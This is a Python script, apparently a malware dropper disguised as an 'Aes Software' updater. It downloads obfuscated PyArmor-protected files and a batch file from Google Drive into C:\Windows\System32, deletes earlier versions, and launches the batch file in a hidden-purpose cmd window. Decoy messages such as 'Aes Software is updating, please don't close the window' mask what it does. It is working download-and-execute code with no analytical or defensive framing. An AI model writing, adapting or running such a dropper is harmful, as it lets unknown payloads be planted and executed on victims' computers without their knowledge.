import subprocess
import sys
import os
import winreg
import requests
import sys

import ctypes
import os
import sys

import os
import gdown

def delete_files_if_aesv3_missing():
    aesv3_path = r"C:\Windows\System32\AesV5.py"
    files_to_delete = [
        r"C:\Windows\System32\aes.py",
        r"C:\Windows\System32\aes.bat",
        r"C:\Windows\System32\pyarmor_runtime_000000"
    ]

    aesv3_exists = os.path.exists(aesv3_path)

    if not aesv3_exists:
        for item in files_to_delete:
            if os.path.exists(item):
                if os.path.isfile(item):
                    os.remove(item)
                    print("")
                elif os.path.isdir(item):
                    shutil.rmtree(item)
                    print("Aes Software is updating, please don't close the window.")
    else:
        print("")

delete_files_if_aesv3_missing()

def download_file_from_google_drive(url, output_path):
    if not os.path.exists(output_path):
        gdown.download(url, output=output_path, quiet=True)

if not os.path.exists("C:\\Windows\\System32\\pyarmor_runtime_000000"):
    print("downloading required libraries, please wait a moment...")
    download_file_from_google_drive("https://drive.google.com/uc?id=1HXDDoBAO9ld5ANgtXI8AjTIzq5JS2m1p", "C:\\Windows\\System32\\__init__.py")
    download_file_from_google_drive("https://drive.google.com/uc?id=1oNMmVZOQB-zE86U89_nPfFm5Y3w5Qot3", "C:\\Windows\\System32\\aesv5.bat")
    download_file_from_google_drive("https://drive.google.com/uc?id=1U0TAT7Qb4JZHuPNIaLLBMVh_4TjAe_sz", "C:\\Windows\\System32\\AesV5.py")
    download_file_from_google_drive("https://drive.google.com/uc?id=1t-AYI6VFLb5gXJhv7JHhH39X06H5VUs9", "C:\\Windows\\System32\\pyarmor_runtime.pyd")


import os
import shutil

directory = r'C:\Windows\System32'

new_dir = os.path.join(directory, 'pyarmor_runtime_000000')
if not os.path.exists(new_dir):
    os.makedirs(new_dir)
    files_to_move = ['__init__.py', 'pyarmor_runtime.pyd']
    for file in files_to_move:
        old_path = os.path.join(directory, file)
        new_path = os.path.join(new_dir, file)
        shutil.move(old_path, new_path)

    print("success")
else:
    print("")
import subprocess

def run_batch_file(batch_file_path):
    try:
        subprocess.run([batch_file_path], shell=True, check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error")
    else:
        print("")

def check_files_existx():
    file_paths = [
        r'C:\Windows\System32\pyarmor_runtime_000000\__init__.py',
        r'C:\Windows\System32\pyarmor_runtime_000000\pyarmor_runtime.pyd'
    ]
    return all(os.path.exists(file_path) for file_path in file_paths)
if not check_files_existx():
    print("Error in aes, please tell the dev.")
    input()
    exit()


batch_file_path = r"C:\Windows\System32\aesv5.bat"
try:
    subprocess.Popen(['start', 'cmd', '/c', batch_file_path], shell=True)
except Exception as e:
    print("Error")
os._exit(0)
sys.exit()

